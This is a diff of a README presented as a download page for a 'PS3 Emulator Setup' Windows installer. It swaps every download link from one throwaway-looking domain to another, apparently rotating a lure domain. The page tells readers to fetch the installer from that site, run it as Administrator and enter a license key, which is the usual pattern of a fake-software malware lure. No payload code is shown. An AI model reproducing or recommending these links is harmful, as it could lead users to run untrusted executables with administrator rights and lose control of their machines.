@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **PS3 Emulator Setup** for Windows.
 
 <p align="center">
-  <a href="https://ps3emu.zipzapsol.space/">
+  <a href="https://ps3emu.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-PS3%20Emulator%20Setup-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download PS3 Emulator Setup">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[ps3emu.zipzapsol.space](https://ps3emu.zipzapsol.space/)** |
-| **Full URL** | `https://ps3emu.zipzapsol.space/` |
+| **Direct link** | **[ps3emu.wonderchain.fun](https://ps3emu.wonderchain.fun/)** |
+| **Full URL** | `https://ps3emu.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — ps3emu.zipzapsol.space](https://ps3emu.zipzapsol.space/)** (link above)
+1. Click **[Download — ps3emu.wonderchain.fun](https://ps3emu.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://ps3emu.zipzapsol.space/"><strong>⬇ Download PS3 Emulator Setup now</strong></a></p>
+<p align="center"><a href="https://ps3emu.wonderchain.fun/"><strong>⬇ Download PS3 Emulator Setup now</strong></a></p>
 
 ---
 
